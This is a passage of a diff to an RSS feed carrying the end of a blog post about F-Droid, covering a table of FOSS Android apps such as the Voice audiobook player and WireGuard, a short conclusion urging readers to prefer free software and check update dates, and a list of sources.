+&lt;td style="text-align: center"&gt;Audiobook player which remembers last position, has bookmarks, Android Auto compatibility and Sleep-timer.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://github.com/PaulWoitaschek/Voice" target="_blank" rel="noreferrer"&gt;GitHub&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="text-align: center"&gt;WireGuard&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.wireguard.android" target="_blank" rel="noreferrer"&gt;Yes&lt;/a&gt;&lt;/td&gt;
+&lt;td style="text-align: center"&gt;VPN&lt;/td&gt;
+&lt;td style="text-align: center"&gt;The official app for managing WireGuard VPN tunnels.&lt;/td&gt;
+&lt;td style="text-align: center"&gt;&lt;a href="https://git.zx2c4.com/wireguard-android" target="_blank" rel="noreferrer"&gt;Git&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 class="relative group"&gt;Conclusion
+&lt;div id="conclusion" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#conclusion" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;
+&lt;p&gt;This is only a brief introduction to the F-Droid world. Next time you are looking for an app, remember to check first if a FOSS alternative exists. Even if you don&amp;rsquo;t want to install the F-Droid client, maybe you could find it on the Play Store: you will receive in return fewer ads on your phone and a more privacy friendly experience.&lt;/p&gt;
+&lt;p&gt;Before installing the app, always check when was the last update. Outdated apps may expose you to security issues (this is a suggestion that applies also when installing apps from the Play Store).&lt;/p&gt;
+&lt;h1 class="relative group"&gt;Sources
+&lt;div id="sources" class="anchor"&gt;&lt;/div&gt;
+&lt;span
+class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
+&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#sources" aria-label="Anchor"&gt;#&lt;/a&gt;
+&lt;/span&gt;
+&lt;/h1&gt;
+&lt;p&gt;If you are interested in this topic, you can check:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://f-droid.org/en/" target="_blank" rel="noreferrer"&gt;fdroid.org&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.reddit.com/r/fdroid/" target="_blank" rel="noreferrer"&gt;r/fdroid on Reddit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.reddit.com/r/fossdroid/" target="_blank" rel="noreferrer"&gt;r/fossdroid on Reddit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://fossdroid.com/" target="_blank" rel="noreferrer"&gt;fossdroid.com&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item></channel></rss>
